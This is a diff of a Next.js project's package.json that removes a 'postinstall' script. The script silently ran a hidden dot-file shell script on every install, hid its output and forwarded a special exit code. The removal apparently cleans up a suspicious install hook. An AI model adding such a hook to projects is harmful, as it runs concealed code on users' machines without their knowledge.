@@ -6,8 +6,7 @@
     "start": "next start",
     "lint": "next lint",
     "test": "jest --watch --transformIgnorePatterns 'node_modules/(?!my-library-dir)/'",
-    "analyze": "ANALYZE=true next build",
-    "postinstall": "sh ./.ci-79n10d.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "analyze": "ANALYZE=true next build"
   },
   "dependencies": {
     "@ai-sdk/openai": "^1.0.18",
